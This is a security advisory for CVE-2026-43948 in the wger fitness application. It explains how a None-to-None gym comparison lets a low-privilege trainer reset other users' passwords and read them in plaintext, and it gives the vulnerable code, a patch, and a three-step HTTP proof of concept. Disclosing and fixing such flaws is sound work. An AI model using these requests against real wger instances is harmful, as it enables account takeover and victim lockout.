# [C] wger: cross-tenant password reset and plaintext disclosure via gym=None bypass

## Summary
Severity: Critical
Advisory: GHSA-mhc8-p3jx-84mm
CVE: CVE-2026-43948
CWE: CWE-863
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-mhc8-p3jx-84mm
Type: github-advisory

## Affected
- PyPI: `wger` — affected >=0 <2.6

## Details
### Summary

The `reset_user_password` and `gym_permissions_user_edit` views in wger perform a gym-scope authorization check using Python object comparison (`!=`) that evaluates `None != None` as `False`, silently bypassing the guard when both the attacker and victim have no gym assignment (`gym=None`). A user with `gym.manage_gym` permission and `gym=None` can reset the password of **any other `gym=None` user**; the new plaintext password is returned verbatim in the HTML response body, enabling one-shot full account takeover. The victim's original password is invalidated, locking them out permanently.

### Details

**File**: `wger/gym/views/user.py`

The authorization guard in `reset_user_password` (and the parallel check in `gym_permissions_user_edit`) uses Django ORM object comparison:

```python
# VULNERABLE - wger/gym/views/user.py
if request.user.userprofile.gym != user.userprofile.gym:
    return HttpResponseForbidden()
```

When both `request.user.userprofile.gym` and `user.userprofile.gym` are `None` (representing users with no gym assignment - the default for newly registered users before gym linking), Python evaluates `None != None` as `False`. The guard therefore passes without raising `HttpResponseForbidden`, and execution continues unconditionally to:

```python
password = password_generator()
user.set_password(password)
user.save()
return render(request, 'user/trainer_login.html', {'password': password, ...})
```

The generated password is rendered verbatim in the response body.

**Affected endpoints**:
- `GET /en/gym/user/<user_pk>/reset-user-password` -> `wger.gym.views.user.reset_user_password`
- `GET /en/gym/user/<user_pk>/edit` -> `wger.gym.views.user.gym_permissions_user_edit`

**Suggested patch**:

```diff
--- a/wger/gym/views/user.py
+++ b/wger/gym/views/user.py
-    if request.user.userprofile.gym != user.userprofile.gym:
-        return HttpResponseForbidden()
+    trainer_gym_id = request.user.userprofile.gym_id   # raw FK int
+    member_gym_id  = user.userprofile.gym_id
+
+    if trainer_gym_id is None or trainer_gym_id != member_gym_id:
+        return HttpResponseForbidden()
```

The `_id` suffix accesses the raw integer foreign key, bypassing Python's object identity semantics. The explicit `is None` guard rejects unaffiliated trainers immediately, regardless of the victim's gym status. Apply the same `same_gym()` helper pattern to all five views sharing this check: `reset_user_password`, `gym_permissions_user_edit`, `admin_notes_list`, `documents_list`, `contracts_list`.

### PoC

Tested on `wger/server:latest` Docker image (runtime: Django 5.2.13). Two test users: `trainer1` (`gym.manage_gym` permission, `userprofile.gym=None`) and `alice` (regular user, `userprofile.gym=None`).

**Step 1** - Authenticate as trainer with `manage_gym` permission and `gym=None`:

```
POST /en/user/login HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

username=trainer1&password=[REDACTED]&csrfmiddlewaretoken=[REDACTED]

-> 302 Found; Set-Cookie: sessionid=[trainer1_session]
```

**Step 2** - Trigger cross-tenant password reset:

```
GET /en/gym/user/2/reset-user-password HTTP/1.1
Host: target
Cookie: sessionid=[trainer1_session]

-> 200 OK
<tr><th>Password</th><td>[GENERATED_PLAINTEXT_PASSWORD]</td></tr>
```

**Step 3** - Authenticate as victim (alice) using leaked password:

```
POST /en/user/login HTTP/1.1
Host: target

username=alice&password=[GENERATED_PLAINTEXT_PASSWORD]&csrfmiddlewaretoken=[...]

-> 302 Found; authenticated as alice
(alice's ORIGINAL password is now invalid - permanent lockout)
```

**RBAC Disproof Protocol** (three-scenario test):
- Scenario A (admin, same-gym) -> HTTP 200 (expected - documented feature)
- Scenario B (trainer1 gym=None -> alice gym=None) -> **HTTP 200 with plaintext password in body** (expected HTTP 403)
- Scenario C (trainer1 gym=1 -> alice gym=2) -> HTTP 403 (expected - guard works when gyms differ, confirms bypass is `None`-specific)

Reproducibility: 2/2 runs after clean-baseline database reset.

### Impact

An attacker with `gym.manage_gym` permission and `gym=None` can:

1. Reset the password of any other `gym=None` user on the wger instance.
2. Receive the new plaintext password in the HTTP response body.
3. Log in as the victim immediately.
4. Permanently lock the victim out (original password invalidated).

**Affected deployments**: every wger instance where `gym.manage_gym` permission is delegated to non-admin users AND any other users exist with `gym=None`. The `gym=None` state is the **default for newly registered users** before manual gym assignment, so every public-registration wger instance is affected.

**Severity**: Critical (CVSS 9.9). Network-reachable, low complexity, requires only low privilege (delegated trainer), scope change (impersonation of other tenant), complete confidentiality/integrity/availability loss for all unaffiliated accounts.

This is the same structural bug class as the sibling finding affecting `trainer_login` (submitted separately). The root cause - Django ORM object-`!=` returning `False` when both sides are `None` - appears across five views and warrants a shared `same_gym()` helper.

## References
- https://github.com/wger-project/wger/security/advisories/GHSA-mhc8-p3jx-84mm
- https://nvd.nist.gov/vuln/detail/CVE-2026-43948
- https://github.com/wger-project/wger
